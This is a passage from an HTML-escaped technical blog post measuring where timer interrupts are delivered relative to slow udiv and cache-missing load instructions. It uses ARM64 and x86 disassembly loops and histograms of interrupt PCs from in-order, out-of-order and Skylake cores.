class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;The logged interrupt PCs had the following distribution on a slow in-order core:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;/p&gt;\n  \n &lt;p class=\"c3\"&gt;&lt;span&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh79bjjrDomCArX8YgAAX47nW6vfXNUUi0_WFbvS4ivPBjbOugqTtH7OZ5ZdRU9RYiHBfKiyUTEJRZCBn_mFN_MP9-v0krZKVaEoVq6mGyqkqNjx0H-2YULQe5ONPIyVrjJ7XBXY0y2UM7IkZfUHUJiVR0XYGYcZrLmDGeAecRkHStfXAmSzGmsT20D/s1252/image3%286%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh79bjjrDomCArX8YgAAX47nW6vfXNUUi0_WFbvS4ivPBjbOugqTtH7OZ5ZdRU9RYiHBfKiyUTEJRZCBn_mFN_MP9-v0krZKVaEoVq6mGyqkqNjx0H-2YULQe5ONPIyVrjJ7XBXY0y2UM7IkZfUHUJiVR0XYGYcZrLmDGeAecRkHStfXAmSzGmsT20D/s1252/image3%286%29.png\" border=\"0\" alt=\"A histogram of PC register values, where most instructions in the loop have roughly equal frequency, the instructions after udiv instructions have twice the frequency, and two other instructions have zero frequency.\" style=\"max-height: 750; max-width: 600px;\"title=\"A histogram of PC register values, where most instructions in the loop have roughly equal frequency, the instructions after udiv instructions have twice the frequency, and two other instructions have zero frequency.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;and this distribution on a fast out-of-order core:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;/p&gt;\n\n &lt;p class=\"c3\"&gt;&lt;span&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjD-BHvjdNFWdHXsha29a8w8Yo62kCoCH7QlHdXcQQHNECyyTM2BdG2Yxy2DL5UBT-XRMVSWeQbYaUBgpbKeBeQPU7AXTyS9J9twZ7eC5TyvBSNtU1p6J5ulb8yaWVAH359IfKzzsI9g8z1hgfcEwhiP3k1LFo_G-dsXpXFLF4A0cyiRTs7yrPpa8ac/s1252/image7%283%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjD-BHvjdNFWdHXsha29a8w8Yo62kCoCH7QlHdXcQQHNECyyTM2BdG2Yxy2DL5UBT-XRMVSWeQbYaUBgpbKeBeQPU7AXTyS9J9twZ7eC5TyvBSNtU1p6J5ulb8yaWVAH359IfKzzsI9g8z1hgfcEwhiP3k1LFo_G-dsXpXFLF4A0cyiRTs7yrPpa8ac/s1252/image7%283%29.png\" border=\"0\" alt=\"A histogram of PC register values, where the first instruction of the loop has very high frequency, the following 4 instructions have near-zero frequency, and the following instructions have low frequencies\" style=\"max-height: 750; max-width: 600px;\"title=\"A histogram of PC register values, where the first instruction of the loop has very high frequency, the following 4 instructions have near-zero frequency, and the following instructions have low frequencies\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;As always, out-of-order (OOO) cores make everything weird, and the start of the loop seems to somehow &amp;quot;provide cover&amp;quot; for the following instructions; but on the in-order core, we can see that more interrupts arrive &lt;/span&gt;&lt;span class=\"c6\"&gt;after&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;the slow udiv instructions. So apparently, when one of those is executing while an interrupt arrives, it continues executing and doesn&amp;#39;t get aborted somehow?&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;With the following loop, which has a &lt;/span&gt;&lt;span class=\"c4\"&gt;LDR&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;instruction mixed in that accesses a memory location that is constantly being modified by another thread:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 4006a0:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000442 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x2, x2, #0x1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 4006a4:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000421 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x1, x1, #0x1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 4006a8:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;9ac20820 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;udiv&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x0, x1, x2&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 4006ac:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91006800 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x0, x0, #0x1a&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 4006b0:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000400 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x0, x0, #0x1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 4006b4:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000442 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x2, x2, #0x1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 4006b8:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000421 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x1, x1, #0x1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 4006bc:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000442 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x2, x2, #0x1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 4006c0:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000421 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x1, x1, #0x1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 4006c4:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;9ac20820 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;udiv&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x0, x1, x2&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 4006c8:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91006800 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x0, x0, #0x1a&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 4006cc:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000400 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x0, x0, #0x1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 4006d0:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000442 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x2, x2, #0x1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 4006d4:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;f9400061 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;ldr&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x1, [x3]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 4006d8:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000421 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x1, x1, #0x1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 4006dc:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000442 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x2, x2, #0x1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c4 c7\"&gt;&amp;nbsp; 4006e0:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000421 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x1, x1, #0x1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; 4006e4:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;17ffffef &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;b&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;4006a0 &amp;lt;main+0x100&amp;gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;the cache-missing loads obviously have a large influence on the timing. On the in-order core:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;/p&gt;\n  \n &lt;p class=\"c3\"&gt;&lt;span&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhd2RdxeFWLW-EaNH0BmFh0bR7cTAxUQWltgd1v4192uhqNBPjlZOfcAjPF11Bh4bFpMN0Qu2iMTSiYwz8nzNwvAEPfopJDb9ZP4PG-3FMTULgznbXTsX9y5PMie65S3L4EGX1tQ_7Be53ettw-tmsP8lhP8G_sDGIeq5DwC9dqN8Y7oAc3SNBz6Hrn/s1252/image4%285%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhd2RdxeFWLW-EaNH0BmFh0bR7cTAxUQWltgd1v4192uhqNBPjlZOfcAjPF11Bh4bFpMN0Qu2iMTSiYwz8nzNwvAEPfopJDb9ZP4PG-3FMTULgznbXTsX9y5PMie65S3L4EGX1tQ_7Be53ettw-tmsP8lhP8G_sDGIeq5DwC9dqN8Y7oAc3SNBz6Hrn/s1252/image4%285%29.png\" border=\"0\" alt=\"A histogram of interrupt instruction pointers, showing that most interrupts are delivered with PC pointing to the instruction after the high-latency load instruction.\" style=\"max-height: 750; max-width: 600px;\"title=\"A histogram of interrupt instruction pointers, showing that most interrupts are delivered with PC pointing to the instruction after the high-latency load instruction.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;On the OOO core:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;/p&gt;\n  \n &lt;p class=\"c3\"&gt;&lt;span&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEihTJNVw4C-vyBUdzEIFRX4tkgjk9rcnZMnn6JEAUQ3LP-NZexmmNFvL1T8LyHtIPmAbMso2arHvB4eBjB81HHxWZgO-wfQpN_Afs48fmZvEVzysO2ov7kawLQFfjq1dJvD4t8oi_5ZnYklJx5MP3jbaDrMrtXeaQlIW6tjsRoYcywfbHt_3o-pd8Yc/s1297/image20.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEihTJNVw4C-vyBUdzEIFRX4tkgjk9rcnZMnn6JEAUQ3LP-NZexmmNFvL1T8LyHtIPmAbMso2arHvB4eBjB81HHxWZgO-wfQpN_Afs48fmZvEVzysO2ov7kawLQFfjq1dJvD4t8oi_5ZnYklJx5MP3jbaDrMrtXeaQlIW6tjsRoYcywfbHt_3o-pd8Yc/s1297/image20.png\" border=\"0\" alt=\"A similar histogram as the previous one, except that an even larger fraction of interrupt PCs are after the high-latency load instruction.\" style=\"max-height: 750; max-width: 600px;\"title=\"A similar histogram as the previous one, except that an even larger fraction of interrupt PCs are after the high-latency load instruction.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;What is interesting to me here is that the timer interrupts seem to again arrive &lt;/span&gt;&lt;span class=\"c6\"&gt;after&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;nbsp;the slow load - implying that if an interrupt arrives while a slow memory access is in progress, the interrupt handler may not get to execute until the memory access has finished? (Unless maybe on the OOO core the interrupt handler can start speculating already? I wouldn&amp;#39;t really expect that, but could imagine it.)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;On an X86 Skylake CPU, we can do a similar test:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; &amp;nbsp; 11b8:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;48 83 c3 01 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add &amp;nbsp; &amp;nbsp;$0x1,%rbx&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; &amp;nbsp; 11bc:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;48 83 c0 01 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add &amp;nbsp; &amp;nbsp;$0x1,%rax&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; &amp;nbsp; 11c0:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;48 01 d8 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add &amp;nbsp; &amp;nbsp;%rbx,%rax&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; &amp;nbsp; 11c3:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;48 83 c3 01 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add &amp;nbsp; &amp;nbsp;$0x1,%rbx&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; &amp;nbsp; 11c7:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;48 83 c0 01 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add &amp;nbsp; &amp;nbsp;$0x1,%rax&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; &amp;nbsp; 11cb:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;48 01 d8 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add &amp;nbsp; &amp;nbsp;%rbx,%rax&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; &amp;nbsp; 11ce:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;48 03 02 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add &amp;nbsp; &amp;nbsp;(%rdx),%rax&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; &amp;nbsp; 11d1:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;48 83 c0 01 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add &amp;nbsp; &amp;nbsp;$0x1,%rax&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; &amp;nbsp; 11d5:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;48 83 c3 01 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add &amp;nbsp; &amp;nbsp;$0x1,%rbx&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; &amp;nbsp; 11d9:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;48 01 d8 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add &amp;nbsp; &amp;nbsp;%rbx,%rax&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; &amp;nbsp; 11dc:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;48 83 c3 01 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add &amp;nbsp; &amp;nbsp;$0x1,%rbx&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; &amp;nbsp; 11e0:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;48 83 c0 01 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add &amp;nbsp; &amp;nbsp;$0x1,%rax&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; &amp;nbsp; 11e4:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;48 01 d8 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add &amp;nbsp; &amp;nbsp;%rbx,%rax&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c7 c4\"&gt;&amp;nbsp; &amp;nbsp; 11e7:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;eb cf &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;jmp &amp;nbsp; &amp;nbsp;11b8 &amp;lt;main+0xf8&amp;gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c1\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c1\"&gt;with a similar result:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;/p&gt;\n  \n  \n &lt;p class=\"c3\"&gt;&lt;span&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEifbDV2Uu_gXT_0s8hOyj3wImUB1O17c9SHpIEkkmAEES8GbgyHlSaPjbESG6SBIbdPPp3sTDao1A_SAcs4CfmgljAY3wa8KKeIQ4Lsg_L0nXFQY-qWL_-vDGyQnSN3vvt2YUmWf2-5WS81VqprDiz5YMq94_k9r1iVRuArhgWcfNBHBU-HtzJrWmX8/s540/image14.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEifbDV2Uu_gXT_0s8hOyj3wImUB1O17c9SHpIEkkmAEES8GbgyHlSaPjbESG6SBIbdPPp3sTDao1A_SAcs4CfmgljAY3wa8KKeIQ4Lsg_L0nXFQY-qWL_-vDGyQnSN3vvt2YUmWf2-5WS81VqprDiz5YMq94_k9r1iVRuArhgWcfNBHBU-HtzJrWmX8/s540/image14.png\" border=\"0\" alt=\"A histogram of interrupt instruction pointers, showing that almost all interrupts were delivered with RIP pointing to the instruction after the high-latency load.\" style=\"max-height: 750; max-width: 